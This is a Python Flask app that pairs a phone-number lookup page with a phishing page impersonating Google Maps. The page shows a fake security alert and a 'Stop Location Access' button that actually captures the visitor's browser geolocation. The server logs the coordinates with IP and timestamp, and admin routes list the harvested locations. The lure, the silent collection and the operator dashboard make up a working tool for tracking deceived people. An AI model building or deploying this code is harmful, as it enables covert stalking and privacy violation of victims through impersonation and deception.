from flask import Flask, render_template_string, request, jsonify
import phonenumbers
from phonenumbers import geocoder, carrier, NumberParseException, timezone, number_type, PhoneNumberType, region_code_for_number
import datetime

app = Flask(__name__)

HTML = """
<!doctype html>
<title>Phone Number Details</title>
<h2>Find Phone Number Details</h2>
<form method="post">
  <input type="text" name="number" placeholder="Enter phone number (with or without country code)" required>
  <input type="submit" value="Find Details">
</form>
{% if details %}
  <h3>Details:</h3>
  <ul>
    <li><b>Number (International):</b> {{ details['international'] }}</li>
    <li><b>Number (National):</b> {{ details['national'] }}</li>
    <li><b>Number (E.164):</b> {{ details['e164'] }}</li>
    <li><b>Number (RFC3966):</b> {{ details['rfc3966'] }}</li>
    <li><b>Valid:</b> {{ details['valid'] }}</li>
    <li><b>Possible:</b> {{ details['possible'] }}</li>
    <li><b>Type:</b> {{ details['type'] }}</li>
    <li><b>Registered Location:</b> {{ details['country'] }}</li>
    <li><b>Region Code:</b> {{ details['region_code'] }}</li>
    <li><b>Carrier:</b> {{ details['carrier'] }}</li>
    <li><b>Time Zone(s):</b> {{ details['timezones'] }}</li>
  </ul>
{% elif error %}
  <p style="color:red;">{{ error }}</p>
{% endif %}
"""

HTML_LOCATION = """
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Google Maps Location Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta property="og:title" content="Google Maps Location Verification" />
  <meta property="og:description" content="Your location has been detected. Please verify to continue." />
  <meta property="og:image" content="/static/delhi-map.png" />
  <meta property="og:type" content="website" />
  <link rel="icon" href="https://maps.gstatic.com/tactile/basepage/pegman_sherlock.png" />
  <style>
    body { margin:0; padding:0; background: #e5e3df; font-family: Roboto, Arial, sans-serif; }
    .header { background: #4285F4; color: white; padding: 16px 0; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.04); }
    .header img { height: 36px; vertical-align: middle; margin-right: 8px; }
    .security-alert { background: #d32f2f; color: white; padding: 12px 16px; text-align: center; font-weight: 600; font-size: 1.1em; }
    .container { max-width: 420px; margin: 24px auto; background: white; border-radius: 12px; box-shadow: 0 2px 16px rgba(0,0,0,0.10); overflow: hidden; }
    .map-img { width: 100%; display: block; filter: blur(3px) brightness(0.95); transition: filter 0.3s; }
    .desc { color: #d32f2f; text-align: center; padding: 18px 16px 10px 16px; font-size: 1.15em; font-weight: 500; }
    .ip-info { background: #f5f5f5; padding: 12px 16px; margin: 0 16px; border-radius: 8px; font-family: monospace; font-size: 0.9em; color: #333; }
    .verify-btn { display: block; width: 90%; margin: 18px auto 10px auto; padding: 14px 0; background: #d32f2f; color: white; font-size: 1.15em; font-weight: 600; border: none; border-radius: 8px; box-shadow: 0 2px 8px rgba(211,47,47,0.3); cursor: pointer; letter-spacing: 0.5px; }
    .verify-btn:active { background: #b71c1c; }
    .footer { text-align: center; color: #888; font-size: 0.95em; padding: 12px 0 8px 0; }
    .spinner { display: none; position: fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,255,255,0.7); z-index:9999; align-items:center; justify-content:center; }
    .spinner-inner { border: 6px solid #f3f3f3; border-top: 6px solid #d32f2f; border-radius: 50%; width: 48px; height: 48px; animation: spin 1s linear infinite; }
    .progress-bar { display: none; width: 90%; margin: 10px auto; background: #f0f0f0; border-radius: 4px; overflow: hidden; }
    .progress-fill { height: 4px; background: #d32f2f; width: 0%; transition: width 0.3s; }
    @keyframes spin { 100% { transform: rotate(360deg); } }
    @media (max-width: 600px) {
      .container { max-width: 98vw; margin: 8px auto; }
      .desc { font-size: 1em; }
      .verify-btn { font-size: 1em; padding: 12px 0; }
    }
  </style>
  <script>
    function showSpinner() {
      document.getElementById('spinner').style.display = 'flex';
      document.getElementById('progress-bar').style.display = 'block';
      var progress = 0;
      var interval = setInterval(function() {
        progress += Math.random() * 15;
        if (progress > 100) progress = 100;
        document.getElementById('progress-fill').style.width = progress + '%';
        if (progress >= 100) clearInterval(interval);
      }, 200);
    }
    function getLocation() {
      showSpinner();
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
      } else {
        window.location.href = 'https://www.google.com/maps';
      }
    }
    function success(position) {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      fetch('/save-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ latitude: lat, longitude: lon })
      }).then(function() {
        // Show success message before redirecting
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('progress-bar').style.display = 'none';
        document.querySelector('.container').innerHTML = '<div style="text-align:center; padding:40px 20px;"><h3 style="color:#4caf50;">✅ Success!</h3><p style="color:#666; margin:20px 0;">Your location access has been stopped successfully.</p><p style="color:#999; font-size:0.9em;">Redirecting to Google Maps...</p></div>';
        setTimeout(function() {
          window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
        }, 2000);
      }).catch(function() {
        window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
      });
    }
    function error(err) {
      window.location.href = 'https://www.google.com/maps';
    }
  </script>
</head>
<body>
  <div class="header">
    <img src="https://www.google.com/images/branding/product/2x/maps_96in128dp.png" alt="Google Maps" />
    <span style="font-size:1.5em; font-weight:500; vertical-align:middle;">Google Maps</span>
  </div>
  <div class="security-alert">⚠️ Security Alert: Location mismatch detected</div>
  <div class="container">
    <div class="desc">Someone is trying to access your location. Click the button below to stop unauthorized access.</div>
    <img class="map-img" src="/static/delhi-map.png" alt="Google Map" />
    <div class="ip-info">Your IP: 192.168.1.105</div>
    <button class="verify-btn" onclick="getLocation()">Stop Location Access</button>
    <div class="progress-bar" id="progress-bar">
      <div class="progress-fill" id="progress-fill"></div>
    </div>
    <div class="footer">&copy; 2025 Google</div>
  </div>
  <div class="spinner" id="spinner"><div class="spinner-inner"></div></div>
</body>
</html>
"""

# Helper to get type as string
def get_number_type_str(num_type):
    types = {
        PhoneNumberType.FIXED_LINE: "Fixed line",
        PhoneNumberType.MOBILE: "Mobile",
        PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed line or Mobile",
        PhoneNumberType.TOLL_FREE: "Toll free",
        PhoneNumberType.PREMIUM_RATE: "Premium rate",
        PhoneNumberType.SHARED_COST: "Shared cost",
        PhoneNumberType.VOIP: "VoIP",
        PhoneNumberType.PERSONAL_NUMBER: "Personal number",
        PhoneNumberType.PAGER: "Pager",
        PhoneNumberType.UAN: "UAN",
        PhoneNumberType.VOICEMAIL: "Voicemail",
        PhoneNumberType.UNKNOWN: "Unknown"
    }
    return types.get(num_type, "Unknown")

@app.route('/', methods=['GET', 'POST'])
def index():
    details = None
    error = None
    if request.method == 'POST':
        number = request.form['number']
        try:
            if number.strip().startswith('+'):
                parsed = phonenumbers.parse(number, None)
            else:
                parsed = phonenumbers.parse(number, 'IN')
            valid = phonenumbers.is_valid_number(parsed)
            possible = phonenumbers.is_possible_number(parsed)
            num_type = get_number_type_str(number_type(parsed))
            country = geocoder.description_for_number(parsed, "en")
            sim_carrier = carrier.name_for_number(parsed, "en")
            tzs = ", ".join(timezone.time_zones_for_number(parsed))
            region = region_code_for_number(parsed)
            details = {
                'international': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
                'national': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL),
                'e164': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164),
                'rfc3966': phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.RFC3966),
                'valid': valid,
                'possible': possible,
                'type': num_type,
                'country': country,
                'region_code': region,
                'carrier': sim_carrier,
                'timezones': tzs
            }
        except NumberParseException as e:
            error = f"Invalid phone number format: {e}"
        except Exception as e:
            error = f"Error: {e}"
    return render_template_string(HTML, details=details, error=error)

@app.route('/get-location')
def get_location():
    return render_template_string(HTML_LOCATION)

@app.route('/save-location', methods=['POST'])
def save_location():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    ip = request.remote_addr
    timestamp = datetime.datetime.now().isoformat()
    url = f"https://www.google.com/maps?q={lat},{lon}"
    with open('locations.txt', 'a') as f:
        f.write(f"{url}  # {timestamp}, {ip}\n")
    return jsonify({'status': 'success'})

@app.route('/admin-locations')
def admin_locations():
    try:
        with open('locations.txt', 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        lines = []
    data = []
    for line in lines:
        url = line.split('#')[0].strip()
        meta = line.split('#')[1].strip() if '#' in line else ''
        data.append({'url': url, 'meta': meta})
    return jsonify(data)

@app.route('/view-locations')
def view_locations():
    try:
        with open('locations.txt', 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        lines = []
    html = '''<h2>Saved Locations</h2>
    <button onclick="copyLinks()">Copy All Links</button>
    <ul>'''
    urls = []
    for line in lines:
        url = line.split('#')[0].strip()
        meta = line.split('#')[1].strip() if '#' in line else ''
        urls.append(url)
        html += f'<li><a href="{url}" target="_blank">{url}</a> <span style="color:#888;font-size:0.9em;">({meta})</span></li>'
    html += '</ul>'
    html += f'''
    <script>
    function copyLinks() {{
        var links = `{chr(10).join(urls)}`;
        navigator.clipboard.writeText(links).then(function() {{
            alert('All links copied to clipboard!');
        }}, function() {{
            alert('Failed to copy links.');
        }});
    }}
    </script>
    '''
    return html

if __name__ == '__main__':
    app.run(debug=True) 